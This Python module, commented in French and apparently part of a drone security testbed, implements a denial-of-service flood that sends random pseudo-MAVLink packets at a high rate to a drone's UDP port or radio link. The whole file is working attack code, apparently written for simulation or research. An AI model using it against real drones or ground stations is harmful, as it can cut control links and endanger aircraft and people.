"""Attaque par Deni de Service (DoS Flood).

Inonde le canal radio ou le port UDP du drone avec des paquets aleatoires a haute cadence
pour saturer les buffers reseau et provoquer un rejet de service.
"""

from __future__ import annotations

import asyncio
import logging
import os
import random
from collections.abc import Callable

logger = logging.getLogger("hybridlink.attacker.dos")


class DosFloodAttack:
    """Generateur de trafic parasite haute frequence."""

    def __init__(self, target_host: str, target_port: int, rate_packets_per_sec: int = 300) -> None:
        self.target_host = target_host
        self.target_port = target_port
        self.rate = rate_packets_per_sec
        self.is_running = False
        self.packets_flooded = 0
        self.send_callback: Callable[[bytes, str, int], None] | None = None

    def generate_junk_packet(self) -> bytes:
        """Genere un datagramme pseudo-MAVLink aleatoire."""
        # En-tete magique 0xFD suivi de bruit blanc
        length = random.randint(20, 80)
        junk = bytearray([0xFD]) + bytearray(os.urandom(length - 1))
        return bytes(junk)

    async def run_flood(self, duration_s: float = 5.0) -> None:
        """Execute l'inondation UDP pendant la duree indiquee."""
        self.is_running = True
        logger.warning(
            f"[ATTAQUE DOS FLOOD] Lancement du flood ({self.rate} pkts/s vers {self.target_host}:{self.target_port}) "
            f"pendant {duration_s}s..."
        )

        interval = 1.0 / self.rate
        start = asyncio.get_running_loop().time()

        while (asyncio.get_running_loop().time() - start) < duration_s:
            pkt = self.generate_junk_packet()
            self.packets_flooded += 1
            if self.send_callback:
                self.send_callback(pkt, self.target_host, self.target_port)
            await asyncio.sleep(interval)

        self.is_running = False
        logger.warning(f"[ATTAQUE DOS FIN] Total paquets parasites emis : {self.packets_flooded}")
